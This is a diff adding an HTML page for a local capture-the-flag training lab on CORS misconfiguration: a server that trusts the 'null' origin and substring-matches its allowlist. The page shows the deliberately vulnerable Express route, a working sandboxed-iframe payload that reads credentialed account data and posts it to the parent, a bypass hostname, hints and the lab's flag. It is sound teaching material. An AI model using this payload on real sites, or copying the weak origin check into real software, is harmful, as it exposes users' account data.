@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>X2 — CORS Null Origin &amp; Weak Allowlist | Hunt Labs</title>
+  <link rel="stylesheet" href="assets/style.css" />
+</head>
+<body>
+
+<!-- ── Nav ─────────────────────────────────────────────── -->
+<nav class="nav">
+  <div class="nav-inner">
+    <a href="index.html" class="nav-logo">[ HUNT ]</a>
+    <div class="nav-links">
+      <a href="index.html">Hub</a>
+      <a href="x2.html" class="active">X2</a>
+      <a href="x2_interview.html">Interview Prep</a>
+    </div>
+    <div class="nav-counter" id="solved-counter">
+      <span class="solved-num">0</span> / 5 solved
+    </div>
+  </div>
+</nav>
+
+<!-- ── Solved Banner ─────────────────────────────────────── -->
+<div class="solved-banner" id="solved-banner">
+  <span class="confetti">&#127881;</span>
+  Lab X2 Solved — Null origin and regex bypass complete!
+  <span class="confetti">&#127881;</span>
+</div>
+
+<!-- ── Lab Page ──────────────────────────────────────────── -->
+<div class="lab-page">
+
+  <!-- ════════ MAIN COLUMN ════════ -->
+  <div class="lab-main">
+
+    <!-- Lab Header -->
+    <div class="lab-header">
+      <div class="lab-header-badges">
+        <span class="badge badge-lab">LAB X2</span>
+        <span class="badge badge-intermediate">Intermediate</span>
+      </div>
+      <h1>CORS Null Origin &amp; Weak Allowlist</h1>
+      <p class="lab-header-desc">
+        The developer added an allowlist, but it trusts <code>null</code> as an origin
+        and uses substring matching (<code>.includes()</code>) instead of exact comparison.
+        Both approaches are trivially bypassed.
+      </p>
+      <div class="lab-header-actions">
+        <a href="x2_interview.html" class="btn btn-ghost btn-sm">&#128218; Interview Prep</a>
+        <a href="index.html" class="btn btn-ghost btn-sm">&#8592; Hub</a>
+      </div>
+      <div class="lab-header-meta">
+        <span>&#128363; Interview relevance:
+          <span class="stars">
+            <span class="star">★</span><span class="star">★</span><span class="star">★</span>
+            <span class="star">★</span><span class="star empty">☆</span>
+          </span>
+        </span>
+        <span>&#128269; Hunt frequency:
+          <span class="stars">
+            <span class="star">★</span><span class="star">★</span><span class="star">★</span>
+            <span class="star">★</span><span class="star empty">☆</span>
+          </span>
+        </span>
+      </div>
+    </div>
+
+    <!-- API Demo Panel -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128241;</span>
+        <span class="panel-title">Account API — With Allowlist</span>
+      </div>
+      <div class="panel-body">
+        <div class="info-grid">
+          <div class="info-cell">
+            <div class="info-cell-label">Endpoint</div>
+            <div class="info-cell-value">GET /api/x2/account</div>
+          </div>
+          <div class="info-cell">
+            <div class="info-cell-label">Auth</div>
+            <div class="info-cell-value">Session cookie (HttpOnly)</div>
+          </div>
+          <div class="info-cell">
+            <div class="info-cell-label">Your origin</div>
+            <div class="info-cell-value" id="your-origin">—</div>
+          </div>
+          <div class="info-cell">
+            <div class="info-cell-label">Attacker origin</div>
+            <div class="info-cell-value" style="color:var(--red);">http://localhost:3001</div>
+          </div>
+        </div>
+
+        <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;">
+          <button class="btn btn-primary" id="btn-fetch-victim">
+            &#9654; Test from Victim Origin
+          </button>
+          <button class="btn btn-ghost" id="btn-fetch-unknown">
+            &#9654; Test with Unknown Origin Header
+          </button>
+        </div>
+
+        <div style="margin-top:4px;">
+          <div style="font-size:12px;color:var(--text-muted);margin-bottom:6px;font-family:var(--mono);">Response Body</div>
+          <div class="response-area" id="resp-body">Click a button above to test the CORS allowlist...</div>
+        </div>
+
+        <div style="margin-top:14px;">
+          <div style="font-size:12px;color:var(--text-muted);margin-bottom:6px;font-family:var(--mono);">Response Headers</div>
+          <div class="terminal" id="resp-headers" style="min-height:80px;">
+            <span class="hl-subtle">// headers will appear here</span>
+          </div>
+        </div>
+
+        <div id="fetch-alert" class="alert" style="margin-top:10px;"></div>
+      </div>
+    </div>
+
+    <!-- Allowlist Inspection -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128270;</span>
+        <span class="panel-title">Allowlist Inspection</span>
+      </div>
+      <div class="panel-body">
+
+        <p style="font-weight:600;color:var(--text);margin-bottom:12px;">Attack Vector 1 — The <code>null</code> Origin</p>
+        <p>
+          Browsers send <code>Origin: null</code> from sandboxed iframes, data URIs, and
+          some redirects. The server explicitly trusts this string. Any attacker page can
+          wrap their exploit in a sandboxed iframe to trigger it:
+        </p>
+        <div class="terminal" style="margin:10px 0;">
+<span class="hl-subtle">&lt;!-- attacker page wraps fetch in a sandboxed iframe --&gt;</span>
+&lt;<span class="hl-blue">iframe</span> <span class="hl-green">sandbox</span>=<span class="hl-orange">"allow-scripts"</span>
+        <span class="hl-green">srcdoc</span>=<span class="hl-orange">"&lt;script&gt;fetch('http://localhost:3000/api/x2/account',{credentials:'include'}).then(r=&gt;r.json()).then(d=&gt;parent.postMessage(d,'*'))&lt;/script&gt;"</span>&gt;
+&lt;/<span class="hl-blue">iframe</span>&gt;
+
+<span class="hl-subtle">// Browser sends: Origin: null</span>
+<span class="hl-subtle">// Server check:  origin === 'null'  →  true  →  allows it</span>
+        </div>
+
+        <hr style="margin:16px 0;" />
+
+        <p style="font-weight:600;color:var(--text);margin-bottom:12px;">Attack Vector 2 — Substring Matching</p>
+        <p>
+          <code>origin.includes('localhost:3000')</code> matches any string containing that
+          substring. A hostname like <code>evillocalhost:3000.attacker.com</code> would pass
+          this check. Always use exact equality or anchored regex:
+        </p>
+        <div class="terminal" style="margin:10px 0;">
+<span class="hl-subtle">// Vulnerable — substring match</span>
+origin.<span class="hl-red">includes</span>(<span class="hl-orange">'localhost:3000'</span>)
+  <span class="hl-subtle">→ passes for: "http://evillocalhost:3000.attacker.com"</span>
+
+<span class="hl-subtle">// Safe — exact match from an allowlist</span>
+<span class="hl-kw">const</span> ALLOWED = [<span class="hl-orange">'http://localhost:3000'</span>, <span class="hl-orange">'https://app.example.com'</span>];
+ALLOWED.<span class="hl-green">includes</span>(origin)   <span class="hl-subtle">← exact equality, no bypass</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Vulnerable Source -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128220;</span>
+        <span class="panel-title">Vulnerable Server Code</span>
+      </div>
+      <div class="panel-body">
+        <pre><code><span class="hl-subtle">// routes/x2.js — weak allowlist with null + substring bypass</span>
+app.get(<span class="hl-orange">'/api/x2/account'</span>, (req, res) =&gt; {
+  <span class="hl-kw">const</span> origin = req.headers[<span class="hl-orange">'origin'</span>] || <span class="hl-orange">''</span>;
+
+  <span class="hl-subtle">// BUG 1: null origin trusted — sandboxed iframes exploit this</span>
+  <span class="hl-subtle">// BUG 2: substring match — 'evillocalhost:3000.attacker.com' passes</span>
+  <span class="hl-kw">const</span> allowed = origin === <span class="hl-orange">'null'</span>
+               || origin.<span class="hl-red">includes</span>(<span class="hl-orange">'localhost:3000'</span>);
+
+  <span class="hl-kw">if</span> (allowed) {
+    res.setHeader(<span class="hl-orange">'Access-Control-Allow-Origin'</span>, origin || <span class="hl-orange">'null'</span>);
+    res.setHeader(<span class="hl-orange">'Access-Control-Allow-Credentials'</span>, <span class="hl-orange">'true'</span>);
+  }
+
+  <span class="hl-kw">const</span> user = req.session?.user || { username: <span class="hl-orange">'victim'</span> };
+  res.json({
+    username: user.username,
+    email:    <span class="hl-orange">'victim@example.com'</span>,
+    flag:     <span class="hl-orange">'HUNT{null_and_regex_both_lose}'</span>,
+  });
+});</code></pre>
+      </div>
+    </div>
+
+    <!-- Objective -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#127919;</span>
+        <span class="panel-title">Objective</span>
+      </div>
+      <div class="panel-body">
+        <ul class="objective-list">
+          <li>
+            <span class="obj-num">1</span>
+            <span>Understand both weaknesses: <code>null</code> origin trust and substring matching. Use the buttons above to see what the allowlist accepts.</span>
+          </li>
+          <li>
+            <span class="obj-num">2</span>
+            <span>Navigate to the attacker origin (<a href="http://localhost:3001/x2.html" target="_blank" rel="noopener">http://localhost:3001/x2.html</a>)
+            and use a sandboxed iframe to trigger <code>Origin: null</code>, bypassing the allowlist.</span>
+          </li>
+          <li>
+            <span class="obj-num">3</span>
+            <span>Read the flag from the JSON response and submit it below.</span>
+          </li>
+        </ul>
+      </div>
+    </div>
+
+  </div><!-- /lab-main -->
+
+  <!-- ════════ SIDEBAR ════════ -->
+  <div class="lab-sidebar">
+
+    <!-- Flag Submission -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#127937;</span>
+        <span class="panel-title">Submit Flag</span>
+      </div>
+      <div class="panel-body">
+        <form class="flag-form" id="flag-form">
+          <input
+            type="text"
+            class="flag-input"
+            id="flag-input"
+            placeholder="HUNT{...}"
+            autocomplete="off"
+            spellcheck="false"
+          />
+          <button type="submit" class="btn btn-primary btn-full">Submit Flag</button>
+        </form>
+        <div id="flag-alert" class="alert"></div>
+      </div>
+    </div>
+
+    <!-- Hints -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128161;</span>
+        <span class="panel-title">Hints</span>
+      </div>
+      <div class="panel-body">
+        <div class="hints-list">
+
+          <div class="hint-item" data-hint="1">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#1</span>
+                <span>Read the matching logic</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              The server checks the Origin against an allowlist — but read the matching
+              logic carefully. Does it compare the <em>whole</em> origin string, or just
+              look for a substring?
+            </div>
+          </div>
+
+          <div class="hint-item" data-hint="2">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#2</span>
+                <span>The null origin source</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              A sandboxed iframe (<code>&lt;iframe sandbox="allow-scripts" srcdoc="..."&gt;</code>)
+              causes the browser to send <code>Origin: null</code> for requests made inside it.
+              The server trusts <code>null</code>.
+            </div>
+          </div>
+
+          <div class="hint-item" data-hint="3">
+            <div class="hint-header">
+              <div class="hint-header-left">
+                <span class="hint-number">#3</span>
+                <span>The exploit structure</span>
+              </div>
+              <button class="btn btn-ghost btn-sm hint-reveal-btn">Reveal</button>
+            </div>
+            <div class="hint-content">
+              In <code>attacker/public/x2.html</code>, wrap your fetch inside a sandboxed
+              iframe's <code>srcdoc</code>. The browser sends <code>Origin: null</code>
+              &rarr; the server's <code>origin === 'null'</code> check passes &rarr; you
+              read the flag. Use <code>parent.postMessage()</code> to send it back.
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- Payload Log -->
+    <div class="panel">
+      <div class="panel-header">
+        <span class="panel-title-icon">&#128196;</span>
+        <span class="panel-title">Payload Log</span>
+        <button
+          class="btn btn-ghost btn-sm"
+          style="margin-left:auto;"
+          onclick="localStorage.removeItem('huntlabs_xo_log_x2'); HuntLabs.renderPayloadLog('x2');"
+        >Clear</button>
+      </div>
+      <div class="panel-body" style="padding:12px;">
+        <div id="payload-log">
+          <div class="log-empty">No payloads logged yet.</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /lab-sidebar -->
+
+</div><!-- /lab-page -->
+
+<script src="assets/main.js"></script>
+<script>
+  const LAB_ID        = 'x2';
+  const EXPECTED_FLAG = 'HUNT{null_and_regex_both_lose}';
+
+  async function doFetch(mode) {
+    const bodyEl    = document.getElementById('resp-body');
+    const headersEl = document.getElementById('resp-headers');
+    const alertEl   = document.getElementById('fetch-alert');
+
+    bodyEl.textContent    = 'Fetching…';
+    headersEl.textContent = '';
+
+    try {
+      const res  = await fetch('/api/x2/account', { credentials: 'include' });
+      const json = await res.json();
+      bodyEl.textContent = JSON.stringify(json, null, 2);
+
+      const cors = {
+        'access-control-allow-origin':      res.headers.get('access-control-allow-origin'),
+        'access-control-allow-credentials': res.headers.get('access-control-allow-credentials'),
+      };
+
+      headersEl.innerHTML = Object.entries(cors).filter(([,v]) => v).map(([name, val]) => {
+        const isACO = name === 'access-control-allow-origin';
+        const cls   = isACO ? 'hl-green' : 'hl-yellow';
+        return `<span class="hl-blue">${HuntLabs.escHtml(name)}:</span> <span class="${cls}">${HuntLabs.escHtml(val)}</span>`;
+      }).join('\n') || '<span class="hl-subtle">No CORS headers (origin not in allowlist)</span>';
+
+      HuntLabs.logPayload(LAB_ID, 'GET /api/x2/account [' + mode + ']', 'CORS test');
+      HuntLabs.renderPayloadLog(LAB_ID);
+      HuntLabs.showAlert(alertEl, 'success', '&#10003; Response received.');
+    } catch(e) {
+      bodyEl.textContent = 'Error: ' + e.message;
+      HuntLabs.showAlert(alertEl, 'error', '&#10007; ' + e.message);
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('your-origin').textContent = location.origin;
+    HuntLabs.initFlagForm(LAB_ID, EXPECTED_FLAG);
+
+    document.getElementById('btn-fetch-victim').addEventListener('click', () => doFetch('victim-origin'));
+    document.getElementById('btn-fetch-unknown').addEventListener('click', () => doFetch('no-origin'));
+  });
+</script>
+</body>
+</html>
